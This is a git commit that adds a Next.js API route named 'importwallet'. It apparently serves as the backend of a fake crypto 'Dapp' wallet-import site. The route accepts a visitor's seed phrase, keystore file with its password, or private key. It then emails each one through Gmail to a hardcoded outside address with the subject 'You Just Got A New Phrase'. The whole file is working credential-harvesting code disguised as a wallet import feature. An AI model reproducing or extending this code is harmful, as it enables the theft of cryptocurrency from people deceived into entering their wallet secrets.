ccd42202193aa665dec9cadb65a0b07efb7663b5
sparrowthedev <sparrowthedev@gmail.com>
2024-07-04 09:13:37 +0100

    First commit

---
+++ src/app/api/importwallet/route.ts
@@ -0,0 +1,164 @@
+import nodemailer from 'nodemailer'
+
+function formatMessage(message: string) {
+  // Split the message into lines
+  const lines = message.split(/\r?\n/);
+
+  // Format each line with a prefix (for example)
+  const formattedLines = lines.map(line => `<div style="margin-bottom: 10px;">${line}</div>`);
+
+  // Join formatted lines into a single HTML string
+  const formattedMessage = formattedLines.join('');
+
+
+  // Return the formatted message
+  return `<div style="font-family: Arial, sans-serif; font-size: 16px; color: #333;">${formattedMessage}</div>`;
+}
+
+function formatJsonToHtmlList(obj: {}) {
+  let html = '<ul>';
+
+  for (const [key, value] of Object.entries(obj)) {
+    if (typeof value === 'object' && value !== null) {
+      html += `<li>${key}: ${formatJsonToHtmlList(value)}</li>`;
+    } else {
+      html += `<li>${key}: ${value}</li>`;
+    }
+  }
+
+  html += '</ul>';
+  return html;
+}
+
+
+export async function POST(request: Request) {
+  try {
+    const { phrase, keystore, privateKey } = await request.json();
+
+    if (phrase) {
+
+      const email = process.env.EMAIL
+      const pass = process.env.PASS
+
+      const transporter = nodemailer.createTransport({
+        service: 'gmail',
+        auth: {
+          user: email,
+          pass,
+        }
+      })
+
+
+      const formattedMessage = formatMessage(phrase);
+
+      const mailOptions = {
+        from: `Dapp App ${email}`,
+        to: "sparrowthedev@gmail.com",
+        subject: "Yo! You Just Got A New Phrase Innit!",
+        html: formattedMessage,
+      }
+
+      transporter.verify(function (error, success) {
+        if (error) {
+          console.log(`here is the error: ${error}`);
+        } else {
+          console.log("Server is ready to take our messages");
+        }
+      });
+
+      const result = await transporter.sendMail(mailOptions);
+
+      if (result.response.includes("OK")) {
+        return Response.json({ message: "email sent succesfully!!" }, { status: 200 });
+      } else {
+        return Response.json({ error: "Internal server error" }, { status: 500 });
+      }
+    }
+
+    if (keystore) {
+
+      const email = process.env.EMAIL
+      const pass = process.env.PASS
+
+      const transporter = nodemailer.createTransport({
+        service: 'gmail',
+        auth: {
+          user: email,
+          pass,
+        }
+      })
+
+      
+
+      const mailOptions = {
+        from: `Dapp App ${email}`,
+        to: "sparrowthedev@gmail.com",
+        subject: "Yo! You Just Got A New Phrase Innit!",
+        html: `<div>Json: ${keystore.json}</div> <div>Password: ${keystore.password}</div>`,
+      }
+
+      transporter.verify(function (error, success) {
+        if (error) {
+          console.log(`here is the error: ${error}`);
+        } else {
+          console.log("Server is ready to take our messages");
+        }
+      });
+
+      const result = await transporter.sendMail(mailOptions);
+
+      if (result.response.includes("OK")) {
+        return Response.json({ message: "email sent succesfully!!" }, { status: 200 });
+      } else {
+        return Response.json({ error: "Internal server error" }, { status: 500 });
+      }
+    }
+
+    if (privateKey) {
+
+      const email = process.env.EMAIL
+      const pass = process.env.PASS
+
+      const transporter = nodemailer.createTransport({
+        service: 'gmail',
+        auth: {
+          user: email,
+          pass,
+        }
+      })
+
+
+
+      const formattedMessage = formatMessage(privateKey);
+
+      const mailOptions = {
+        from: `Dapp App ${email}`,
+        to: "sparrowthedev@gmail.com",
+        subject: "Yo! You Just Got A New Phrase Innit!",
+        html: formattedMessage,
+      }
+
+      transporter.verify(function (error, success) {
+        if (error) {
+          console.log(`here is the error: ${error}`);
+        } else {
+          console.log("Server is ready to take our messages");
+        }
+      });
+
+      const result = await transporter.sendMail(mailOptions);
+
+      if (result.response.includes("OK")) {
+        return Response.json({ message: "email sent succesfully!!" }, { status: 200 });
+      } else {
+        return Response.json({ error: "Internal server error" }, { status: 500 });
+      }
+    }
+
+
+    return Response.json({ message: 'Submission Failed' }, { status: 500 })
+
+  } catch (error) {
+    return Response.json({ error: error });
+  }
+}
